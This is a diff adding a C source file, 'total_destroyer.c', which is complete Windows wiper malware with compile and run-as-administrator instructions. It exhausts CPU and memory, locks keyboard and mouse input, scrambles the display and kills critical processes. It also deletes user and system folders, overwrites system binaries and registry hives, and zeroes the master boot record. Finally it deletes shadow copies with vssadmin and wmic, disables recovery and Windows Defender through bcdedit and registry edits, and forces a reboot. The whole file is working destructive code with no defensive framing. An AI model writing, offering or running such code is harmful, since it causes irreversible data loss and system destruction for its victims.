@@ -1,0 +1,275 @@
+// total_destroyer.c
+// Compile: gcc -o total_destroyer.exe total_destroyer.c -luser32 -lkernel32 -lgdi32 -ladvapi32 -lwinmm -lntdll
+// Run as Administrator.
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+// ---------- CPU & RAM Killer ----------
+DWORD WINAPI cpu_killer(LPVOID lpParam) {
+    while (1) {
+        // Busy loop, consume CPU
+        volatile unsigned long long x = 0;
+        for (unsigned long long i = 0; i < 1000000000; i++) {
+            x += i * 3;
+        }
+    }
+    return 0;
+}
+
+DWORD WINAPI ram_killer(LPVOID lpParam) {
+    while (1) {
+        // Allocate 100 MB chunks until out of memory
+        void* p = malloc(100 * 1024 * 1024);
+        if (p) {
+            memset(p, 0xAA, 100 * 1024 * 1024); // touch memory
+        } else {
+            // If allocation fails, sleep and retry
+            Sleep(100);
+        }
+    }
+    return 0;
+}
+
+// ---------- Mouse & Keyboard Freeze ----------
+DWORD WINAPI input_blocker(LPVOID lpParam) {
+    while (1) {
+        BlockInput(TRUE);   // Blocks all keyboard and mouse input
+        Sleep(1000);        // Keep blocked
+        // No need to unblock; we want it locked forever
+    }
+    return 0;
+}
+
+// ---------- Screen Distortion ----------
+DWORD WINAPI screen_distorter(LPVOID lpParam) {
+    HDC hdc = GetDC(NULL);
+    int screenW = GetSystemMetrics(SM_CXSCREEN);
+    int screenH = GetSystemMetrics(SM_CYSCREEN);
+    RECT desktop;
+    GetClientRect(GetDesktopWindow(), &desktop);
+
+    // Prepare random garbage
+    char* garbage = (char*)malloc(screenW * screenH * 4);
+    if (!garbage) garbage = (char*)malloc(1024 * 1024); // fallback
+    memset(garbage, 0xAA, screenW * screenH * 4);
+
+    while (1) {
+        // 1. Invert colors every 0.1 sec
+        BitBlt(hdc, 0, 0, screenW, screenH, hdc, 0, 0, NOTSRCCOPY);
+
+        // 2. Random stretch / distortion using StretchBlt
+        int sx = rand() % (screenW/2);
+        int sy = rand() % (screenH/2);
+        int sw = rand() % (screenW/2) + 100;
+        int sh = rand() % (screenH/2) + 100;
+        StretchBlt(hdc, 0, 0, screenW, screenH, hdc, sx, sy, sw, sh, SRCCOPY);
+
+        // 3. Draw random filled rectangles with random colors
+        HBRUSH brush = CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256));
+        SelectObject(hdc, brush);
+        Rectangle(hdc, rand()%screenW, rand()%screenH, rand()%screenW, rand()%screenH);
+        DeleteObject(brush);
+
+        // 4. Change display resolution to weird values
+        DEVMODE dm = {0};
+        dm.dmSize = sizeof(dm);
+        dm.dmPelsWidth = 640 + (rand() % 4) * 400;
+        dm.dmPelsHeight = 480 + (rand() % 4) * 300;
+        dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
+        ChangeDisplaySettings(&dm, CDS_UPDATERECT);
+
+        // 5. Force redraw desktop by invalidating
+        InvalidateRect(GetDesktopWindow(), NULL, TRUE);
+        UpdateWindow(GetDesktopWindow());
+
+        Sleep(100);
+    }
+    return 0;
+}
+
+// ---------- Windows Destruction (from previous) ----------
+void wipe_directory(const char* path) {
+    char searchPath[MAX_PATH];
+    char fullPath[MAX_PATH];
+    WIN32_FIND_DATA findData;
+    HANDLE hFind;
+
+    snprintf(searchPath, MAX_PATH, "%s\\*", path);
+    hFind = FindFirstFile(searchPath, &findData);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    do {
+        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
+            continue;
+
+        snprintf(fullPath, MAX_PATH, "%s\\%s", path, findData.cFileName);
+
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            wipe_directory(fullPath);
+            RemoveDirectory(fullPath);
+        } else {
+            SetFileAttributes(fullPath, FILE_ATTRIBUTE_NORMAL);
+            DeleteFile(fullPath);
+        }
+    } while (FindNextFile(hFind, &findData));
+
+    FindClose(hFind);
+    RemoveDirectory(path);
+}
+
+void corrupt_system_files() {
+    const char* targets[] = {
+        "C:\\Windows\\System32\\ntoskrnl.exe",
+        "C:\\Windows\\System32\\kernel32.dll",
+        "C:\\Windows\\System32\\hal.dll",
+        "C:\\Windows\\System32\\winload.exe",
+        "C:\\Windows\\System32\\bootmgr",
+        "C:\\Windows\\System32\\config\\SYSTEM",
+        "C:\\Windows\\System32\\config\\SOFTWARE",
+        "C:\\Windows\\System32\\config\\SAM",
+        "C:\\Windows\\System32\\config\\SECURITY",
+        "C:\\Windows\\System32\\drivers\\ntfs.sys",
+        "C:\\Windows\\System32\\drivers\\disk.sys",
+        NULL
+    };
+    HANDLE hFile;
+    DWORD written;
+    char garbage[4096];
+    memset(garbage, 0xAA, sizeof(garbage));
+
+    for (int i = 0; targets[i] != NULL; i++) {
+        hFile = CreateFile(targets[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            for (int j = 0; j < 1024; j++) {
+                WriteFile(hFile, garbage, sizeof(garbage), &written, NULL);
+            }
+            CloseHandle(hFile);
+        }
+    }
+}
+
+void wipe_mbr() {
+    HANDLE hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDisk != INVALID_HANDLE_VALUE) {
+        char mbr[512];
+        memset(mbr, 0x00, 512);
+        DWORD written;
+        WriteFile(hDisk, mbr, 512, &written, NULL);
+        CloseHandle(hDisk);
+    }
+}
+
+void disable_recovery() {
+    system("bcdedit /set {default} recoveryenabled no");
+    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
+    system("reagentc /disable");
+    system("sfc /disable");
+}
+
+void kill_processes() {
+    const char* procs[] = {
+        "explorer.exe", "winlogon.exe", "csrss.exe", "services.exe", "lsass.exe",
+        "svchost.exe", "spoolsv.exe", "dwm.exe", "taskmgr.exe", "cmd.exe", "powershell.exe",
+        NULL
+    };
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = { sizeof(pe) };
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            for (int i = 0; procs[i] != NULL; i++) {
+                if (_stricmp(pe.szExeFile, procs[i]) == 0) {
+                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if (hProc) {
+                        TerminateProcess(hProc, 1);
+                        CloseHandle(hProc);
+                    }
+                }
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+}
+
+void delete_shadows() {
+    system("vssadmin delete shadows /all /quiet");
+    system("wmic shadowcopy delete");
+    system("wmic restorepoint delete");
+}
+
+void corrupt_registry() {
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager", 0, KEY_SET_VALUE, &hKey);
+    RegSetValueEx(hKey, "PendingFileRenameOperations", 0, REG_MULTI_SZ, (BYTE*)"\0", 2);
+    RegCloseKey(hKey);
+
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SafeBoot", 0, KEY_SET_VALUE, &hKey);
+    RegDeleteKey(hKey, "Minimal");
+    RegDeleteKey(hKey, "Network");
+    RegCloseKey(hKey);
+
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", 0, KEY_SET_VALUE, &hKey);
+    DWORD val = 1;
+    RegSetValueEx(hKey, "NoAutoUpdate", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+    RegCloseKey(hKey);
+
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey);
+    DWORD disable = 1;
+    RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+    RegCloseKey(hKey);
+}
+
+// ---------- Main ----------
+int main() {
+    srand(time(NULL));
+
+    // Phase 1: Spawn CPU and RAM killers (many threads)
+    for (int i = 0; i < 16; i++) {
+        HANDLE h = CreateThread(NULL, 0, cpu_killer, NULL, 0, NULL);
+        CloseHandle(h);
+    }
+    for (int i = 0; i < 8; i++) {
+        HANDLE h = CreateThread(NULL, 0, ram_killer, NULL, 0, NULL);
+        CloseHandle(h);
+    }
+
+    // Phase 2: Block input
+    HANDLE hInput = CreateThread(NULL, 0, input_blocker, NULL, 0, NULL);
+    CloseHandle(hInput);
+
+    // Phase 3: Distort screen
+    HANDLE hScreen = CreateThread(NULL, 0, screen_distorter, NULL, 0, NULL);
+    CloseHandle(hScreen);
+
+    // Phase 4: Kill critical processes
+    kill_processes();
+
+    // Phase 5: Delete all user data
+    char userPath[MAX_PATH];
+    if (SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userPath) == S_OK) {
+        wipe_directory(userPath);
+    }
+    wipe_directory("C:\\Windows\\System32\\config");
+    wipe_directory("C:\\Windows\\System32\\drivers");
+
+    // Phase 6: Corrupt system files
+    corrupt_system_files();
+
+    // Phase 7: Wipe MBR
+    wipe_mbr();
+
+    // Phase 8: Delete shadows and disable recovery
+    delete_shadows();
+    disable_recovery();
+
+    // Phase 9: Corrupt registry
+    corrupt_registry();
+
+    // Phase 10: Final shutdown
+    system("shutdown /r /t 0 /f");
+
+    return 0;
+}
